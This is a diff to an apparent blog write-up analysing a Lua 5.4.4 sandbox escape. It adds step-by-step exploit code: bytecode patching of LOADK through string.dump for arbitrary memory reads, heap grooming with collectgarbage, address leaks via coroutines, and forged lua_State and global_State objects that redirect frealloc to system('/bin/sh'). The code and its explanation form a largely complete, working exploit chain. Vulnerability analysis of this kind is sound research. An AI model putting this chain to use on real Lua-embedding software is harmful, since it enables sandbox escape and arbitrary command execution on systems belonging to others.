@@ -251,31 +251,164 @@ The follwing is an analysis of the existing version of the sandbox escaping expl
 
   Now let's go back to the AAR code and take a look at the `readAddr` function.
 
-  When the `foo` function used in the first part is converted into byte code, it is converted as shown in `example of bytecode`. It can be seen that the converted bytecode uses `LOADK`. As mentioned above, it uses `OP_LEN` to find out by substituting a desired address instead of a string using the vulnerability of LOADK.
+  When the `foo` function used in the first part is converted into byte code, it is converted as shown in `example of bytecode`. As mentioned above, by using the vulnerability of `LOADK` the desired address is substituted for the string, and then the value of the desired address is found through the `OP_LEN` instruction.
+
+  The collectgarbage function is used to satisfy the two conditions mentioned in the root cause part. After assigning the declared variable to nil, executing collectgarbage(), and then declaring a variable of the same size, a chunk with the same address is allocated.
+
+  Using this point, it induces the attacker to allocate the chunk of the variable declared by the attacker to the variable `k`, finds the distance between this variable and the desired address, and sets the offset using `string.dump`
+
+  First set the variable `k` you want to assign and the location of the address you want to read.
+
+  ```lua
+  local _k={}
+  local _str={}
+  if (tostring(_k)>tostring(_str)) then
+      local _t = _str
+      _str = _k
+      _k = _t
+  end
+  ```
+
+  In this code, the `_k` variable must not be located at an address higher than the position of the `_str` variable on the virtual memory addres, so in this case, the two variables are replaced.
+
+  ```lua
+  local _addr = numTo64L(addr - 16)
+  local padding_a = string.rep('\65', 8) -- 0x41 padding
+  local padding_b = string.rep('\20', 15) -- LUA_VLNGSTR tag padding
+  ```
+
+  After that, it creates a string padded with a padding value of 0x41, an address subtracted by 0x10 from the address to be read (because the length variable is stored at 0x10 based on the `TString` structure), and a `LUA_VLNSTR` tag. After calculating the position of the generated string, the offset of the `LOADK` instruction is replaced.
+
+  ```lua
+  foo = string.dump(foo)
+  foo = foo:gsub(escapeString(createLOADK(0,2)),
+          escapeString(createLOADK(0, (_str_addr+0x20 - _objAddr(_k))/16 ))) 
+
+  collectgarbage()
+  _k=nil
+  collectgarbage()
+
+  foo = load(foo)
+  return foo()
+  ```
+
+  If you execute the `foo` function replaced with `string.gsub` as above, AAR to find out the value assigned to the address attacker wants to read becomes possible. Implement `objAddr`, a function that finds the address of an object using the `readAddr` function implemented in this way.
+
+  ```lua
+  local function objAddr(o)
+    local known_objects = {}
+    known_objects['thread'] = 1; known_objects['function']=1; known_objects['userdata']=1; known_objects['table'] = 1;
+    local tp = type(o)
+    if (known_objects[tp]) then return _objAddr(o) end
+
+    local f = function(a) coroutine.yield(a) end
+    local t = coroutine.create(f)
+    local top = readAddr(_objAddr(t) + 0x10) --The field top is in offset 0x10
+
+    coroutine.resume(t, o)
+    local addr = readAddr(top)
+
+    return addr
+  end
+  ```
+
+  In the `objAddr` function, if there are four data types (`thread`, `function`, `userdata`, `table`) in which the address of data is indicated by the `tostring` function, it is obtained directly through `_objAddr`. In other cases, the `readAddr` function is executed using the `top` member variable in `lua_State` after putting it as an argument of the coroutine that executes `coroutine.yield`. The value of the input address is read through two function executions (once the value pointed to by `top`, and once AAR is performed using the value).
 
 
 
 ### Fake object
 
+  Now, create `fake lua_State` and `fake global_State` using the AAR described above.
+
+  ```lua
+  local f = function() coroutine.yield() local a = string.rep('asda', 20) end
+  local t = coroutine.create(f)
+  coroutine.resume(t)
+  local t_addr = objAddr(t)
+
+  local l_G_addr = readAddr(readAddr(t_addr) + 0x18)
+  l_G = memcpy(l_G_addr, 1416) -- sizeof(global_State)=1416
+  l_G = numTo64L(addr) .. numTo64L(arg) .. l_G:sub(17)
+  l_G_addr = bufferAddress(l_G)
+
+  local t_buffer = memcpy(t_addr, 200) -- sizeof(lua_State)=200
+
+  t_buffer = t_buffer:sub(1,14) .. '\01\01' .. t_buffer:sub(17,24).. numTo64L(l_G_addr) .. t_buffer:sub(33)
+
+  collectgarbage()
+  t_addr = bufferAddress(t_buffer) -- t_addr = &fake_luaState
+  ```
+
+  After creating a `coroutine`, use the `thread` to get the address of `global_State` and copy as much as the size of `global_State` from the address to create a `fake global_State` string. After that, in the same way, the thread (`lua_State`) assigned to the variable `t` is copied to create the `fake lua_State` string. After that, the address to be executed is set to the location of `frealloc` of `fake global_State`, and the address of the first desired argument is set to the location of `ud`. Set the address of the `fake global_State` set in this way as the `l_G` variable of the `fake lua_State`.
+
 
 ### Call frealloc
+
+
+  We finish the exploit using the `fake lua_State` created in the `Fake Object` table of contents
+
+  ```lua
+  local g = function() local a="a" coroutine.resume(a) end
+
+  g = string.dump(g)
+
+  g = g:gsub(escapeString(createLOADK(0,0)),
+          escapeString(createLOADK(0, (t_addr-k_addr)/16)))
+
+  collectgarbage()
+
+  -- clean tcache bins
+
+  local t1 = {}
+  local t2 = {}
+  local t3 = {}
+  local t4 = {}
+  local t5 = {}
+  local t6 = {}
+  local t7 = {}
+
+  collectgarbage()
+
+  k=nil
+  collectgarbage()
+
+  g, err = load(g)
+  g() 
+
+  ```
+
+  We'll use the same trick we used to do the AAR here after declaring the function `g`. During the operation of `g` using `string.dump`, `fake lua_State` is set as an argument of `coroutine.resume(a)` instead of a string. After that, `load(g)` is executed to call the `string.rep` function defined in function `f`. At this time, Lua internally allocates chunks for string creation. During this process, the global_State's `frealloc` function is called, and the `global_State` referenced at this time is a `fake global_State` created by the attacker. So, instead of calling the normal `frealloc`, it calls system(“/bin/sh”) and the attacker can get the shell.
+
 
 ## Exploit flow schematic
 
 ![image-center]({{ '/images/previous-vulnerabilities/exploit_flow1.jpeg' | absolute_url }}){: .align-center}
-</br>
+<br></br>
 
 ![image-center]({{ '/images/previous-vulnerabilities/exploit_flow2.jpeg' | absolute_url }}){: .align-center}
-</br>
+<br></br>
 
 ![image-center]({{ '/images/previous-vulnerabilities/exploit_flow3.jpeg' | absolute_url }}){: .align-center}
 
 
 ## Reference
 
-[lua-5.2.4-sandbox-escape](https://github.com/erezto/lua-sandbox-escape)
+- [lua-5.2.4-sandbox-escape](https://github.com/erezto/lua-sandbox-escape)
 
-[lua-5.4.4-sandbox-escape](https://github.com/Lua-Project/lua-5.4.4-sandbox-escape)
+- [lua-5.4.4-sandbox-escape](https://github.com/Lua-Project/lua-5.4.4-sandbox-escape)
+
+- [lua-bytecode](https://www.luac.nl/)
+
+- [lua-5.3-Bytecode-Reference](https://the-ravi-programming-language.readthedocs.io/en/latest/lua_bytecode_reference.html#)
+
+- [Programming-in-Lua](https://www.lua.org/pil/contents.html)
+
+- [github-lua](https://github.com/lua/lua)
+
+- [string.gsub](http://www.lua.org/manual/5.4/manual.html#pdf-string.gsub)
+
+- [string.dump](http://www.lua.org/manual/5.4/manual.html#pdf-string.dump)
+
 
 
 
